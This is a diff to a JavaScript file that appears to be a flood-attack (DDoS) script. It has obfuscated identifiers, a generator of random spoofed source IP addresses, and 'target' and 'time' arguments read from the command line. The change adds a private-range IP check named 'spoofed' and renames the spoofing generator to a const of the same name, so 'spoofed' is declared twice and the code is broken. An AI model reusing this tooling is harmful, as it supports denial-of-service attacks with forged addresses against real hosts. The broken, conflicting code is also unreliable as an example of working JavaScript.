@@ -330,14 +330,31 @@ function randnombor(_0x3af870) {
   return _0x5c028c;
 }
 
+
+function spoofed(ip, privateRanges) {
+  if (!ip) {
+    throw new Error('IP address is required');
+  }
+  if (!privateRanges || !Array.isArray(privateRanges)) {
+    privateRanges = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
+  }
+  const ipRange = ipaddr.parse(ip);
+  for (let i = 0; i < privateRanges.length; i++) {
+    const range = ipaddr.parseCIDR(privateRanges[i]);
+    if (ipRange.match(range)) {
+      return true;
+    }
+  }
+  return false;
+}
+
 function randomElement(_0x21da9f) {
   return _0x21da9f[Math.floor(Math.random() * (_0x21da9f.length - 0x0) + 0x0)];
 } 
 
-const ip_spoof = () => {
+const spoofed = () => {
   return Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100);
 };
-const spoofed = ip_spoof();
 const args = {
   'target': process.argv[2],
   'time': ~~process.argv[3],
